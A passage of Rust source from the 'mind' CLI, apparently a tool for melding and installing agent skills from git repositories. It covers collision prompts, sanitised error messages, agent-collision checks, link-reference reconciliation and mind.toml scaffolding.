        .map(|(k, n, s)| {
            let safe_n = strip_ansi(n);
            let safe_s = strip_ansi(s);
            format!("  {k}:{safe_n} (already installed from '{safe_s}')")
        })
        .collect::<Vec<_>>()
        .join("\n")
}

/// The parsed outcome of a user's response to the NS-44 collision prompt.
enum CollisionAnswer {
    /// Accept the given prefix (empty string = no prefix, non-empty = custom prefix).
    Prefix(String),
    /// User chose to abort; stop the meld with SkillCollision.
    Abort,
}

/// Parse the user's raw answer to the NS-44 collision prompt (spec: NS-44).
///
/// - Empty (Enter) → accept the pre-populated suggested prefix.
/// - `.` → abort (same outcome as the non-interactive non-TTY path).
/// - Anything else → use as a custom prefix (caller must validate it).
fn parse_collision_answer(answer: &str, suggested: &str) -> CollisionAnswer {
    let trimmed = answer.trim();
    if trimmed.is_empty() {
        // spec: NS-44 — accepting the suggestion continues under that prefix.
        CollisionAnswer::Prefix(suggested.to_string())
    } else if trimmed == "." {
        // spec: NS-44 — aborting stops meld with a non-zero exit.
        CollisionAnswer::Abort
    } else {
        CollisionAnswer::Prefix(trimmed.to_string())
    }
}

/// Return the display token for a source's manifest origin (MKT-10).
///
/// The token is prepended with a space so it can be concatenated directly into
/// the bracketed metadata string `[commit ns hook origin]`. Returns an empty
/// string when the source has no recorded origin (convention / mind.toml source).
fn origin_label(origin: Option<ManifestOrigin>) -> String {
    match origin {
        None => String::new(),
        Some(ManifestOrigin::ClaudePlugin) => " origin:claude-plugin".to_string(),
        Some(ManifestOrigin::ClaudeMarketplace) => " origin:claude-marketplace".to_string(),
    }
}

/// Resolve a [`plugin_manifest::MarketplaceEntry`] to the repo spec string
/// needed by `meld_recursive`.
///
/// - `External { spec }`: the spec is used verbatim (passed to `parse_spec`).
/// - `InRepo { path }`: the path is joined onto `clone_dir` to produce an
///   absolute local path, which `parse_spec` recognises as a local source.
fn marketplace_entry_spec(
    entry: &plugin_manifest::MarketplaceEntry,
    clone_dir: &std::path::Path,
) -> String {
    match &entry.source {
        plugin_manifest::PluginSource::External { spec } => spec.clone(),
        plugin_manifest::PluginSource::InRepo { path } => {
            clone_dir.join(path).to_string_lossy().into_owned()
        }
    }
}

/// Build the human-readable lines for an auth failure of a nested source, per
/// DSC-69. The first line is always the standard auth-failure line, with
/// `" (skipping)"` appended under the `"skip"` action. When `message` is set it
/// is the second line, shown immediately after.
fn auth_failure_lines(entry_name: &str, cfg: &crate::mindfile::OnAuthFailure) -> Vec<String> {
    // spec: DSC-69
    let is_skip = cfg.action == AuthFailureAction::Skip;
    let safe_name = strip_ansi(entry_name);
    let mut lines = vec![format!(
        "unable to meld source {} due to authentication failure{}",
        safe_name,
        if is_skip { " (skipping)" } else { "" }
    )];
    if let Some(msg) = &cfg.message {
        // spec: DSC-69 -- strip ANSI escape sequences and non-printable bytes so
        // a malicious curator message cannot corrupt the terminal.
        let safe_msg = strip_ansi(msg);
        lines.push(safe_msg);
    }
    lines
}

/// Build the human-readable warning lines for a non-auth clone failure of a
/// nested source, per DSC-79. The entry name and the underlying error are both
/// passed through `strip_ansi` so a malicious remote (via error text) or entry
/// name cannot corrupt the terminal.
fn clone_failure_lines(entry_name: &str, err: &MindError) -> Vec<String> {
    // spec: DSC-79
    let safe_name = strip_ansi(entry_name);
    let safe_err = strip_ansi(&err.to_string());
    vec![format!(
        "  warning: skipping '{safe_name}': clone failed ({safe_err}), source unavailable"
    )]
}

/// Handle a top-level (direct, user-initiated) git clone failure for `meld`.
///
/// In human mode (spec: CLI-180):
/// - Prints git's stderr (sanitized via strip_ansi, spec: CLI-186) so the
///   actual cause is immediately visible.
/// - Under `--verbose` also prints the reconstructed command line and the
///   internal store path; without it those details are suppressed.
/// - Prints auth or proxy remediation hints where applicable (CLI-177, CLI-178).
/// - Returns a `MindError::Git` with args reduced to `["clone"]` and stderr set
///   to `"(git output above)"` so the display does not repeat the store path
///   and never shows the literal `<no stderr>` (CLI-185).
///
/// Under `--json` (spec: CLI-184):
/// - Skips all eprintln output (hints and stderr) so only the JSON envelope
///   appears on stdout; git's stderr is preserved in the returned error so the
///   CLI-181 envelope's `message` field carries the actual cause.
fn handle_top_level_clone_err(
    e: MindError,
    ssh_url: Option<String>,
    store_path: &std::path::Path,
    out: crate::render::OutputCtx,
) -> MindError {
    // spec: CLI-184 -- under --json skip all stderr output; preserve the cause
    // so the JSON envelope message is informative.
    if out.json {
        // Keep git's stderr intact; reduce args to hide the internal store path.
        return match e {
            MindError::Git {
                url,
                status,
                stderr,
                ..
            } => MindError::Git {
                url,
                args: vec!["clone".to_string()],
                status,
                stderr,
            },
            other => other,
        };
    }

    // spec: CLI-180, CLI-186 -- lead with git's stderr (sanitized against
    // ANSI/bidi injection from a hostile server).
    if let MindError::Git {
        ref stderr,
        ref args,
        ..
    } = e
    {
        if !stderr.is_empty() {
            eprintln!("{}", strip_ansi(stderr));
        }
        if out.verbose {
            eprintln!("  command: git {}", args.join(" "));
            eprintln!("  store:   {}", store_path.display());
        }
    }
    // spec: CLI-177 -- auth hint for non-local remotes.
    if git::is_auth_failure(&e) {
        if let Some(ref ssh) = ssh_url {
            for line in git::auth_hint_lines(ssh) {
                eprintln!("{line}");
            }
        }
    // spec: CLI-178 -- proxy hint.
    } else if git::is_proxy_failure(&e) {
        for line in git::proxy_hint_lines() {
            eprintln!("{line}");
        }
    }
    // spec: CLI-185 -- set stderr to "(git output above)" so the returned
    // error's Display never shows the misleading literal `<no stderr>` when
    // git output was already streamed to the terminal above.
    match e {
        MindError::Git { url, status, .. } => MindError::Git {
            url,
            args: vec!["clone".to_string()],
            status,
            stderr: "(git output above)".to_string(),
        },
        other => other,
    }
}

/// Warn when a namespaced source references siblings in bare prose, which
/// prefixing will break unless rewritten as `{{ns:name}}` tokens. Scans every
/// text file of each item (the whole skill directory, or the agent/rule file),
/// matching the breadth of install-time `{{ns:}}` expansion.
fn warn_unguarded_references(items: &[CatalogItem]) {
    // spec: CLI-162 -- advisory only emitted under --verbose.
    if !crate::render::ctx().verbose {
        return;
    }
    // Only meaningful once a prefix is in effect.
    if !items.iter().any(|it| it.prefix.is_some()) {
        return;
    }
    // spec: NS-42 -- exclude pure-agent names from the warning scan: a bare prose
    // reference to a sibling agent resolves correctly even under a prefix (because
    // agents link under their bare harness name, NS-40). Flagging agent references
    // would be a false positive. The cross-kind shadow rule: if a name is both an
    // agent AND a non-agent sibling, it is NOT excluded (it does get prefixed for
    // the non-agent kind, so the warning is still meaningful).
    let agent_names: std::collections::HashSet<String> = items
        .iter()
        .filter(|it| it.kind == ItemKind::Agent)
        .map(|it| it.name.clone())
        .collect();
    let non_agent_names: std::collections::HashSet<String> = items
        .iter()
        .filter(|it| it.kind != ItemKind::Agent)
        .map(|it| it.name.clone())
        .collect();
    // The scanning set: all names except pure-agent-only ones.
    let siblings: std::collections::HashSet<String> = items
        .iter()
        .map(|it| it.name.clone())
        .filter(|name| {
            // Keep the name if it is not an agent, OR if it is also a non-agent
            // sibling (the shadow case).
            !agent_names.contains(name) || non_agent_names.contains(name)
        })
        .collect();
    for item in items {
        let mut refs: Vec<String> = Vec::new();
        for file in crate::review::item_files(item) {
            let Ok(content) = std::fs::read_to_string(&file) else {
                continue; // skip non-UTF-8 / unreadable files
            };
            for r in crate::namespace::unguarded_refs(&content, &siblings) {
                // Self-mentions are fine; dedup across files.
                if r != item.name && !refs.contains(&r) {
                    refs.push(r);
                }
            }
        }
        if !refs.is_empty() {
            // spec: DSC-95 -- sanitize each field before composing (not
            // the finished line): both the item key and each sibling name are
            // source-controlled, and an unterminated escape in one would
            // otherwise consume the trailing advisory text.
            let refs_display: Vec<String> = refs
                .iter()
                .map(|r| crate::sanitize::strip_ansi(r))
                .collect();
            eprintln!(
                "warning: {} references sibling(s) in prose: {}; prefixing may break them at runtime (use {{{{ns:name}}}})",
                item.display_key(),
                refs_display.join(", ")
            );
        }
    }
}

/// Warn when melding a source whose agents would collide with already-installed
/// agents from a different source (NS-41 advisory). Does not fail meld; the
/// actual enforcement is at `learn` time with `AgentCollision`.
fn warn_agent_collisions(paths: &Paths, items: &[CatalogItem]) {
    // spec: NS-41
    let manifest = match Manifest::load(paths) {
        Ok(m) => m,
        Err(_) => return, // manifest unavailable; skip advisory rather than propagate
    };
    let agent_homes = match paths.agent_homes() {
        Ok(h) => h,
        Err(_) => return,
    };
    for item in items {
        if item.kind != ItemKind::Agent {
            continue;
        }
        let harness_name = item
            .agent_harness_name()
            .unwrap_or_else(|| item.name.clone());
        let link_rel = item
            .link_rel
            .clone()
            .or_else(|| paths.default_link_rel(ItemKind::Agent, &harness_name));
        let Some(rel) = link_rel else { continue };
        let planned: Vec<std::path::PathBuf> = agent_homes
            .iter()
            .filter(|h| h.admits(ItemKind::Agent))
            .map(|h| h.path.join(&rel))
            .collect();
        for entry in manifest.items.values() {
            if entry.kind != ItemKind::Agent {
                continue;
            }
            // Same item (re-meld of the same source): not a collision.
            if entry.source == item.source && entry.bare_name == item.name {
                continue;
            }
            let collides = entry.links.iter().any(|link| {
                planned
                    .iter()
                    .any(|p| p.as_path() == std::path::Path::new(link.as_str()))
            });
            if collides {
                // spec: CLI-225 DSC-95 -- `entry.key()` is `kind:name` built from
                // the installed item's (source-influenced) name, which
                // `is_safe_item_name` does not restrict against shell
                // metacharacters OR ANSI/control/bidi code points, and lands in a
                // pasteable `mind forget` remedy, so it is sanitized (DSC-95) and
                // then shell-quoted before printing.
                let quoted_key = crate::error::shell_quote(&entry.display_key());
                eprintln!(
                    "warning: agent '{harness_name}' from '{}' would collide with the installed \
                     agent from '{}' at agents/{harness_name}.md -- run `mind forget {quoted_key}` to \
                     remove it first",
                    item.source, entry.source,
                );
            }
        }
    }
}

/// NS-41: if `target` is an agent whose bare harness link would collide with an
/// already-installed agent from a *different* source, return the `AgentCollision`
/// error to raise. Returns `Ok(None)` for a non-agent, no collision, or a
/// same-identity re-install/upgrade (matched by stable identity
/// `(source, bare_name)`). The planned links mirror what `install` will create,
/// so an explicit `mind.toml` `link` is honored the same way.
fn agent_collision(
    paths: &Paths,
    manifest: &Manifest,
    target: &CatalogItem,
) -> Result<Option<MindError>> {
    // spec: NS-41
    if target.kind != ItemKind::Agent {
        return Ok(None);
    }
    let harness_name = target
        .agent_harness_name()
        .unwrap_or_else(|| target.name.clone());
    let Some(rel) = target
        .link_rel
        .clone()
        .or_else(|| paths.default_link_rel(ItemKind::Agent, &harness_name))
    else {
        return Ok(None);
    };
    let planned: Vec<std::path::PathBuf> = paths
        .agent_homes()?
        .iter()
        .filter(|h| h.admits(ItemKind::Agent))
        .map(|h| h.path.join(&rel))
        .collect();
    for entry in manifest.items.values() {
        if entry.kind != ItemKind::Agent {
            continue;
        }
        // Same item from the same source (upgrade / re-install): not a collision.
        if entry.source == target.source && entry.bare_name == target.name {
            continue;
        }
        let collides = entry.links.iter().any(|link| {
            planned
                .iter()
                .any(|p| p.as_path() == std::path::Path::new(link.as_str()))
        });
        if collides {
            return Ok(Some(MindError::AgentCollision {
                name: harness_name,
                existing: entry.source.clone(),
                incoming: target.source.clone(),
            }));
        }
    }
    Ok(None)
}

/// The set of bare item names belonging to a source, for reference validation.
/// Every catalog item belonging to `source`, used to validate and expand an
/// item's reference tokens at install (the `{{ns:}}` names plus the `{{self}}` /
/// `{{tools:}}` / `{{path:}}` path tokens, which need each sibling's kind/bin).
fn siblings_of(items: &[CatalogItem], source: &str) -> Vec<CatalogItem> {
    items
        .iter()
        .filter(|it| it.source == source)
        .cloned()
        .collect()
}

/// The remedy an item link's unsatisfiable reference points at (LNK-18): drop
/// the link instance, then meld the whole repo and install just this skill,
/// which brings the skill's dependency closure with it (DEP-30).
///
/// The `unmeld` step is required. The link instance is registered before the
/// install runs, so it is registered on both paths when this is printed -- the
/// warning path goes on to install the skill, the error path installs nothing
/// -- and a bare `meld ... --learn` would therefore leave a second source for
/// the same repo, and collide with the name the link already installed on the
/// warning path (NS-43/CLI-33). Removing the instance first is what makes the
/// printed command work when pasted.
///
/// `add_root` emits the `--add-root .` form (DSC-84), for the repo whose
/// declared inventory does not offer the linked skill at all -- the case item
/// links exist for. Without it the meld half of the command would fail with
/// `LearnPatternNoMatch` AFTER the unmeld half already succeeded, leaving the
/// user with the skill uninstalled, the link gone, and a stray whole-repo
/// source. The caller decides by scanning the clone
/// ([`plain_meld_reaches_link`]), never by name.
///
/// spec: DSC-95 -- the identity, the clone URL, and the item name are all
/// source-controlled, so each is sanitized and shell-quoted BEFORE being
/// composed into the command line handed to the user.
/// spec: CLI-236 -- `--learn` matches its pattern as a glob when it carries
/// glob metacharacters, and an item name may contain them (`is_safe_item_name`
/// rejects path separators and the DSC-96 blocked classes, not `*`/`?`/`[`).
/// A skill named `pdf[x]` would otherwise make this command install some OTHER
/// item, so the name is glob-escaped and the emitted pattern matches literally.
/// The pattern is also kind-qualified (`skill:`): an item link is always a
/// skill (LNK-7), and a bare name would additionally match a same-named agent
/// or rule in the repo, dropping prompt content the user never asked for.
/// The `--add-root` value that would make a plain meld reach the skill at
/// `item_path` (LNK-18, DSC-84).
///
/// An added root is convention-scanned two ways (`catalog::scan_add_roots`):
/// flat, where a skill is a bare child directory of the root, and containered,
/// where it is `<root>/skills/<name>`. Both are ONE level deep, so the root has
/// to be the skill's own parent, or its grandparent when the parent is the
/// `skills/` container. Always emitting `.` reaches only a skill sitting at
/// `<repo-root>/skills/<name>` (or flat at the repo root); for anything deeper,
/// such as `vendor/pkg/skills/foo`, the meld half of the remedy would fail with
/// `LearnPatternNoMatch` AFTER the unmeld half already succeeded, which is the
/// destroy-then-fail sequence the two-branch remedy exists to prevent.
///
/// The repo root itself is spelled `.`, which is what `validate_scan_root`
/// accepts for "scan the whole clone".
fn link_add_root(item_path: &str, kind: ItemKind) -> String {
    let item = std::path::Path::new(item_path);
    let root = match item.parent() {
        // `<...>/<kind>s/<name>` -> the parent of the container.
        Some(parent) if parent.file_name().is_some_and(|n| n == kind.dir()) => parent.parent(),
        // A flat skill dir -> its own parent.
        other => other,
    };
    let rendered = root
        .map(|p| p.to_string_lossy().into_owned())
        .unwrap_or_default();
    if rendered.is_empty() {
        ".".to_string()
    } else {
        rendered
    }
}

/// Parse the consumer's `--kind` flag against the spec it was passed with
/// (CLI-239).
///
/// Two usage errors are caught here, before any clone: a value that is not an
/// item kind at all, and a flag passed with a spec that is not an item link
/// (nothing else about a meld is kind-scoped). Whether the kind FITS the link's
/// shape needs the clone, so it is decided later, by the catalog scan (LNK-21).
pub fn parse_link_kind(kind: Option<&str>, spec: &str) -> Result<Option<ItemKind>> {
    let Some(raw) = kind.map(str::trim).filter(|k| !k.is_empty()) else {
        return Ok(None);
    };
    let parsed = ItemKind::parse(raw).ok_or_else(|| MindError::BadKindFlag {
        value: strip_ansi(raw),
        reason: "not an item kind; expected agent, rule, or command".to_string(),
    })?;
    // spec: CLI-216 -- an identity-only parse to classify the spec, not a
    // decision to clone: quiet. A spec that does not parse at all is left to
    // the meld/learn path, which reports its own error.
    if parse_spec_quiet(spec).is_ok_and(|s| s.item_path.is_none()) {
        return Err(MindError::BadKindFlag {
            value: strip_ansi(raw),
            reason: format!(
                "'{}' is not an item link, and --kind applies to one only                  (an item link is '<repo-url>/blob/<ref>/<file>.md' or                  '<repo-url>/tree/<ref>/<skill-dir>')",
                strip_ansi(spec)
            ),
        });
    }
    Ok(Some(parsed))
}

/// Whether a whole-repo meld could discover the linked item at all (LNK-18).
///
/// A skill link always can: a skill is found flat (a bare child directory of a
/// scan root) as well as under a `skills/` container, so the derived
/// `--add-root` reaches it wherever it sits. A FILE link can only when its
/// parent directory is its kind's container (`agents/`, `rules/`, `commands/`):
/// convention discovery has no flat pass for file kinds, so a file anywhere
/// else is reachable only through the link.
fn link_is_conventionally_placed(source: &crate::source::Source, kind: ItemKind) -> bool {
    let Some(item_path) = source.item_path.as_deref() else {
        return true;
    };
    if !catalog::is_file_link(item_path) {
        return true;
    }
    std::path::Path::new(item_path)
        .parent()
        .and_then(|p| p.file_name())
        .is_some_and(|n| n == kind.dir())
}

fn link_meld_remedy(
    identity: &str,
    url: &str,
    item_name: &str,
    kind: ItemKind,
    add_root: Option<&str>,
) -> String {
    // spec: CLI-28 -- `unmeld`'s selector is glob-aware too, and a link
    // identity embeds the skill's repo path (LNK-4), so a skill directory
    // named `pdf[x]` yields the identity `host/o/r#skills/pdf[x]`, which
    // `source_matches_glob` compiles as a PATTERN and matches against nothing:
    // the unmeld half would fail with `no melded source matches ...` and the
    // whole remedy would stop at its first command. Escaping is a no-op for an
    // identity with no metacharacters, so the ordinary form is unchanged.
    let identity = crate::error::shell_quote(&glob::Pattern::escape(&strip_ansi(identity)));
    let url = crate::error::shell_quote(&strip_ansi(url));
    let pattern = crate::error::shell_quote(&format!(
        "{}:{}",
        kind.as_str(),
        glob::Pattern::escape(&strip_ansi(item_name))
    ));
    // spec: CLI-225 -- the root is derived from the source-controlled link path,
    // so it is sanitized and shell-quoted like every other value in this command.
    let add_root = add_root
        .map(|r| format!(" --add-root {}", crate::error::shell_quote(&strip_ansi(r))))
        .unwrap_or_default();
    // `--yes` on both halves: without it a non-TTY run (a script, CI, anything
    // piping output) unmelds and then installs NOTHING while exiting 0, so the
    // printed command would silently do half its job. It skips the install
    // confirmations only; a source install hook keeps its own consent prompt
    // (HOOK-20), which `--yes` does not bypass.
    format!("mind unmeld {identity} --yes && mind meld {url}{add_root} --learn {pattern} --yes")
}

/// Whether an ordinary `meld` of the linked repo would discover the linked
/// skill by itself, deciding which [`link_meld_remedy`] form to print (LNK-18).
///
/// Decided by PATH, not by name: the clone already on disk is scanned as if it
/// were an ordinary whole-repo source (the same `Source`, with `item_path`
/// cleared), and the answer is yes only when that scan yields a `Skill` at the
/// very directory the link points at. Matching on the bare name instead would
/// call a repo reachable when its inventory declares a DIFFERENT `review`
/// (say `vendor/review`) than the one the link installed, and the remedy would
/// then quietly install the wrong skill.
///
/// A hint, not a gate: any error from the scan (an unreadable clone, a
/// malformed `mind.toml`, a version gate) answers "not reachable", so the
/// caller falls back to the `--add-root .` form, which also works on a repo
/// that would have been discovered anyway (DSC-85 drops the duplicate). It is
/// called only when a remedy is about to be printed, so an ordinary link
/// install never pays for a whole-clone scan.
fn plain_meld_reaches_link(paths: &Paths, source: &crate::source::Source, kind: ItemKind) -> bool {
    let Some(item_path) = source.item_path.as_deref() else {
        return true;
    };
    let clone_dir = source.clone_dir(paths);
    let whole = crate::source::Source {
        item_path: None,
        item_kind: None,
        curated_by: None,
        ..source.clone()
    };
    let mut items: Vec<CatalogItem> = Vec::new();
    if catalog::scan_source_at(&clone_dir, &whole, &mut items).is_err() {
        return false;
    }
    let canon = |p: &std::path::Path| p.canonicalize().unwrap_or_else(|_| p.to_path_buf());
    let target = canon(&clone_dir.join(item_path));
    items
        .iter()
        .any(|it| it.kind == kind && canon(&it.path) == target)
}

/// Whether a `requires` entry (DEP-4) can resolve inside a single-item
/// link instance, whose only sibling is the linked skill itself (LNK-7).
///
/// A malformed or source-qualified entry returns `true` so it stays with the
/// item and install raises its specific DEP-7 cause; only an entry that is
/// well-formed and intra-source but names something other than the linked
/// skill is unsatisfiable by construction.
fn requires_resolves_alone(entry: &str, item: &CatalogItem) -> bool {
    let Ok(r) = crate::resolve::parse_item_ref(entry) else {
        return true; // InvalidRef: install reports the specific cause
    };
    if r.source.is_some() {
        return true; // CrossSource: same
    }
    r.name == item.name && r.kind.is_none_or(|k| k == item.kind)
}

/// Whether a token naming a sibling could resolve in a catalog whose only item
/// is `item` itself (LNK-7).
///
/// Mirrors the two expanders' own resolution rules: `{{ns:name}}` matches a
/// sibling of any kind by bare name (NS-11), `{{tools:name}}` matches only a
/// `Tool` (TOOL-15), and `{{path:[kind:]name}}` matches by bare name with an
/// optional kind narrowing (TOOL-18). With one item in the catalog, all three
/// reduce to "names this item, under a kind this item has".
fn sibling_token_resolves_alone(r: &crate::namespace::SiblingRef, item: &CatalogItem) -> bool {
    r.name == item.name && r.kind.is_none_or(|k| k == item.kind)
}

/// The files an item's tokens are expanded in, mirroring `install::expand_references`:
/// every markdown file (NS-53), plus any non-markdown file the item lists in its
/// `expand:` frontmatter (NS-57). Scanning a narrower set than install expands
/// would let a reference slip past the LNK-18 check and fail later with the
/// blunt error LNK-18 exists to replace.
///
/// spec: LIFE-52 -- the tree walk is `install::collect_files`, the same capped
/// walker the install path itself uses, so this pre-install scan hits the same
/// depth cap and reports the same structured error instead of recursing
/// unbounded on a crafted source.
fn expandable_files(item: &CatalogItem) -> Result<Vec<std::path::PathBuf>> {
    let mut files: Vec<std::path::PathBuf> = Vec::new();
    if item.path.is_dir() {
        install::collect_files(&item.path, &mut files)?;
        files.sort();
    } else {
        files.push(item.path.clone());
    }
    let expand: Vec<&str> = item.expand.iter().map(String::as_str).collect();
    Ok(files
        .into_iter()
        .filter(|file| {
            // A single-file item (agent/rule) has no bundled files, so only its
            // own path applies and its markdown-ness is read from that path.
            if crate::namespace::is_markdown(file) {
                return true;
            }
            if !item.path.is_dir() {
                return false;
            }
            file.strip_prefix(&item.path)
                .is_ok_and(|rel| expand.iter().any(|e| std::path::Path::new(e) == rel))
        })
        .collect())
}

/// spec: LNK-18 -- reconcile a single-item item-link instance's intra-source
/// references before it is installed.
///
/// A link instance's catalog is exactly the linked skill (LNK-7), so a
/// reference to any other name can never resolve however the repo is laid out.
/// The two reference FORMS are treated differently, following DEP-4's own
/// distinction between them:
///
/// - A token (`{{ns:}}`, `{{tools:}}`, `{{path:}}`) is rewritten into the item's
///   text at install (NS-10/TOOL-15/TOOL-18), so it cannot be left dangling: it
///   stays a hard error, with the remedy attached (`LinkRefUnsatisfiable`)
///   instead of the blunt DEP-6/TOOL-17 `BadReference`.
/// - A `requires:` entry is pure metadata (DEP-4). It is dropped from the item,
///   recorded on the installed record, and warned about, so the skill still
///   installs rather than being unreachable by link at all.
///
/// Returns the item unchanged (borrowed) plus an empty drop list for any source
/// that is not a link instance, so the ordinary install path is untouched. The
/// drop list rides back to the caller (rather than onto the catalog item) so it
/// can be recorded on the INSTALLED record, which is what survives the command
/// (LNK-19).
fn link_reconciled<'a>(
    paths: &Paths,
    registry: &Registry,
    item: &'a CatalogItem,
) -> Result<(std::borrow::Cow<'a, CatalogItem>, Vec<String>)> {
    let Some(source) = registry.find(&item.source) else {
        return Ok((std::borrow::Cow::Borrowed(item), Vec::new()));
    };
    if source.item_path.is_none() {
        return Ok((std::borrow::Cow::Borrowed(item), Vec::new()));
    }
    // Computed lazily: the reachability probe scans the whole clone, and most
    // link installs never print a remedy at all.
    let remedy = || {
        // spec: LNK-18 -- a file link outside its kind's container directory is
        // reachable only as a link (convention discovery finds a file item only
        // at `<root>/<kind>s/<name>.md`, and there is no flat pass for file
        // kinds), so no command is printed: one would unmeld and then fail.
        if !link_is_conventionally_placed(source, item.kind) {
            return format!(
                "the linked file sits outside a conventional {}/ directory, so no whole-repo meld \
                 discovers it; drop the reference, or move the file under {}/ upstream",
                item.kind.dir(),
                item.kind.dir()
            );
        }
        // The added root is derived from the link's own path, not fixed at `.`:
        // an added root is scanned only one level deep, so an item nested under
        // `vendor/pkg/skills/` needs that directory named (LNK-18).
        let add_root = (!plain_meld_reaches_link(paths, source, item.kind))
            .then(|| {
                source
                    .item_path
                    .as_deref()
                    .map(|p| link_add_root(p, item.kind))
            })
            .flatten();
        let command = link_meld_remedy(
            &source.name,
            &source.url,
            &item.name,
            item.kind,
            add_root.as_deref(),
        );
        format!("meld the whole repo and install just this item: `{command}`")
    };

    // A token naming anything but the linked skill is a hard stop. Scan exactly
    // the files install expands (markdown plus `expand:`-listed, NS-53/NS-57).
    for file in expandable_files(item)? {
        let Ok(text) = std::fs::read_to_string(&file) else {
            continue;
        };
        for r in crate::namespace::sibling_reference_tokens(&text) {
            if sibling_token_resolves_alone(&r, item) {
                continue;
            }
            // spec: DSC-95 -- the token text is source-controlled and is the
            // whole `referent` field, so sanitize it here, at the boundary,
            // before it reaches the error's verbatim interpolation.
            return Err(MindError::LinkRefUnsatisfiable {
                item: item.display_key(),
                referent: strip_ansi(&r.token),
                in_source: strip_ansi(&item.source),
                remedy: remedy(),
            });
        }
    }

    // An unsatisfiable `requires` entry is metadata: record, warn, drop, install.
    let (keep, dropped): (Vec<String>, Vec<String>) = item
        .requires
        .iter()
        .cloned()
        .partition(|e| requires_resolves_alone(e, item));
    if dropped.is_empty() {
        return Ok((std::borrow::Cow::Borrowed(item), Vec::new()));
    }
    // spec: DSC-95 -- sanitize each raw entry BEFORE the join, so one entry's
    // dangling escape cannot swallow the entries after it.
    let dropped: Vec<String> = dropped.iter().map(|e| strip_ansi(e)).collect();
    let listed = dropped.join(", ");
    // spec: LNK-19 -- the warning is transient; the durable record on the
    // installed item is what `recall`/`introspect`/`--json` surface later.
    let remedy = remedy();
    crate::render::warn(format!(
        "{} declares requires {listed}, which was dropped: source {} is a single-item \
         link with no siblings, so the requirement cannot resolve. To install this item \
         together with what it requires, {remedy}",
        item.display_key(),
        strip_ansi(&item.source)
    ));
    let mut reconciled = item.clone();
    reconciled.requires = keep;
    Ok((std::borrow::Cow::Owned(reconciled), dropped))
}

/// `mind init-source [path] [--template]` — maintainer scaffolding. Discovers the
/// repo's items, reports the intra-source reference graph, scaffolds a `mind.toml`
/// if absent, and (with `--template`) rewrites bare sibling references into
/// `{{ns:}}` tokens. With `--marketplace` generates `.claude-plugin/marketplace.json`.
/// Operates only on the target directory: no store, no agent home, no network (INIT-6).
// spec: INIT-1 INIT-2 INIT-3 INIT-4 INIT-6 INIT-9 INIT-10 INIT-11 INIT-12
pub fn init_source(
    dir: Option<&str>,
    template: bool,
    marketplace: bool,
    flat_skills_flag: bool,
    namespace: Option<String>,
) -> Result<()> {
    let dir = dir.unwrap_or(".");
    let path = std::path::Path::new(dir);
    if !path.is_dir() {
        return Err(MindError::NotADirectory {
            path: dir.to_string(),
        });
    }
    let root = path.canonicalize().map_err(|e| MindError::io(path, e))?;

    let toml_path = root.join("mind.toml");

    // Read the pre-existing mind.toml content (if any) for the scaffold patching
    // step and for extracting description/prefix for the marketplace manifest.
    let pre_toml = if toml_path.exists() {
        Some(std::fs::read_to_string(&toml_path).map_err(|e| MindError::io(&toml_path, e))?)
    } else {
        None
    };

    // Discover items exactly as melding would (INIT-2): build a local Source for
    // the directory and scan it (honors convention + mind.toml + min-mind-version).
    // Set flat_skills on the source struct before scanning so flat layout is used
    // even before mind.toml is written (INIT-12, DSC-74).
    let mut source = parse_spec(&root.to_string_lossy())?;
    if flat_skills_flag {
        source.flat_skills = true;
    }
    let mut items: Vec<CatalogItem> = Vec::new();
    catalog::scan_source_at(&root, &source, &mut items)?;

    println!("init-source: {}", root.display());
    if items.is_empty() {
        println!(
            "  no items found (skills/<name>/SKILL.md, agents/<name>.md, rules/<name>.md, \
             commands/<name>.md)"
        );
    } else {
        println!("  {} item(s):", items.len());
        for it in &items {
            println!("    {} {}", it.kind, it.display_name());
        }
    }

    // Reference graph (INIT-4): per item, the siblings it references via tokens
    // (informational) and the ones it mentions in bare prose. The bare mentions
    // are reported as `unguarded-reference` advisories in the same format as
    // `review` (CLI-131), so review and init-source read identically.
    let siblings: std::collections::HashSet<String> =
        items.iter().map(|it| it.name.clone()).collect();
    // INIT-9: the bare-prose `unguarded-reference` advisory fires only when an
    // effective prefix is in force (matching `meld` NS-23 and `review` CLI-133):
    // absent a prefix, bare references resolve as written. The `{{ns:}}`-token
    // graph and the `--template` rewrite below are unaffected by this gate.
    let prefix_in_force = items.iter().any(|it| it.prefix.is_some());
    let mut findings: Vec<crate::review::Finding> = Vec::new();
    for it in &items {
        let content = read_item_text(it);
        let tokens: Vec<String> = crate::namespace::referenced_names(&content)
            .into_iter()
            .filter(|n| n != &it.name)
            .collect();
        let bare: Vec<String> = crate::namespace::unguarded_refs(&content, &siblings)
            .into_iter()
            .filter(|n| n != &it.name)
            .collect();
        if !tokens.is_empty() {
            println!(
                "  {} {} -> {} (tokenized)",
                it.kind,
                it.name,
                tokens.join(", ")
            );
        }
        if prefix_in_force && !bare.is_empty() {
            findings.push(crate::review::Finding::advisory(
                "unguarded-reference",
                format!(
                    "{}: references sibling(s) in prose: {}; prefixing may break them at runtime (use {{{{ns:name}}}})",
                    it.key().as_str(),
                    bare.join(", ")
                ),
            ));
        }
    }
    // The `--template` hint applies only to bare prose references; duplicate
    // tooling is structural and not something templating fixes.
    let has_unguarded = findings.iter().any(|f| f.kind == "unguarded-reference");
    // INIT-7: surface the same duplicate-tooling advisories `review` reports
    // (CLI-144), so the two commands read identically here too.
    findings.extend(crate::review::duplicate_tooling_findings(&items));
    crate::review::print_findings(&[], &findings);
    if has_unguarded && !template {
        // spec: CLI-225 -- `dir` is the user's own CLI path argument, not
        // restricted against shell metacharacters, and lands in a pasteable
        // `mind init-source <dir> --template` remedy, so it is shell-quoted
        // before printing (same rule as source/item identities elsewhere).
        let quoted_dir = crate::error::shell_quote(dir);
        println!(
            "run `mind init-source {quoted_dir} --template` to wrap the bare references as {{{{ns:name}}}}"
        );
    }

    // mind.toml handling: INIT-3 (create if absent) + INIT-12 (patch when flags
    // require it). When flat_skills_flag or namespace is set, always write (patch
    // existing or create with scaffold); otherwise keep the create-if-absent logic.
    if flat_skills_flag || namespace.is_some() {
        let patched = crate::scaffold::patch_source_meta(
            pre_toml.as_deref(),
            flat_skills_flag,
            namespace.as_deref(),
        );
        std::fs::write(&toml_path, &patched).map_err(|e| MindError::io(&toml_path, e))?;
        println!("  wrote mind.toml");
    } else if toml_path.exists() {
        println!("  mind.toml already exists; left unchanged");
    } else {
        std::fs::write(&toml_path, crate::scaffold::SCAFFOLD)
            .map_err(|e| MindError::io(&toml_path, e))?;
        println!("  wrote mind.toml");
    }

